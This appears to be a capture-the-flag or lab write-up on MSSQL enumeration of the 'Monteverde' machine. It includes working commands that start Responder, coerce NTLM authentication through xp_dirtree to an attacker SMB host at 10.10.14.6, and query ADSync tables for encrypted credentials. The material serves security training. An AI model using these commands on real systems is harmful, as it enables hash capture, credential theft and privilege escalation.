# MSSQL Enumeration — Monteverde

Following a foothold with the `mhope` account, the tester enumerated SQL Server instances and databases. The presence of the `ADSync` database and certain extended stored procedures indicated promising privilege escalation paths.

## Database Discovery

The following databases were enumerated:

- master
- tempdb
- model
- msdb
- ADSync

```ps1
sqlcmd -Q "select name,create_date from sys.databases"
```

## PowerUpSQL Audit

A PowerUpSQL audit identified that `xp_dirtree` was executable by the public role. This functionality can be abused to coerce the SQL Server service account to authenticate to a remote SMB listener, allowing capture of the machine account hash for offline cracking or NTLM relay.

```ps1
Invoke-SQLAudit -Verbose
# Vulnerability: Excessive Privilege - Execute xp_dirtree
```

## Exploitation — xp_dirtree

A responder listener was started to capture NTLM authentication and `xp_dirtree` was invoked from SQL Server, which produced the machine account NTLM hash.

```sh
# On attacker host
sudo responder -I tun0
# On target via sqlcmd or PowerShell
sqlcmd -Q "xp_dirtree '\\\\10.10.14.6\\test'"
```

Captured machine account hash (excerpt) was obtained for later cracking or relaying.

## ADSync Artifacts

The `ADSync` database contained `private_configuration_xml` and `encrypted_configuration` fields; the tester extracted the base64 blob and analyzed structure to identify an encrypted credential storage. Instance identifiers and entropy values were noted as part of the decryption process.

```ps1
USE ADSync; SELECT private_configuration_xml, encrypted_configuration from mms_management_agent
```

**Conclusion:** SQL Server misconfigurations and ADSync artifacts provided multiple avenues to recover higher-privilege credentials when processed appropriately.

